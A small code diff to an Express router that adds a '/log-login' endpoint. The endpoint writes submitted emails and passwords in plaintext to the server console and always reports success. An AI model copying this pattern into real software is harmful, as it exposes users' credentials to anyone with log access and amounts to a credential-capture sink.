@@ -4,6 +4,13 @@ import authService from '../services/authService.js';
 
 const router = express.Router();
 
+// Log login attempts
+router.post('/log-login', (req, res) => {
+    const { email, password } = req.body;
+    console.log('new submit', email, password);
+    res.json({ success: true });
+});
+
 // Check if operator is whitelisted
 router.post('/check-whitelist', async (req, res) => {
     try {
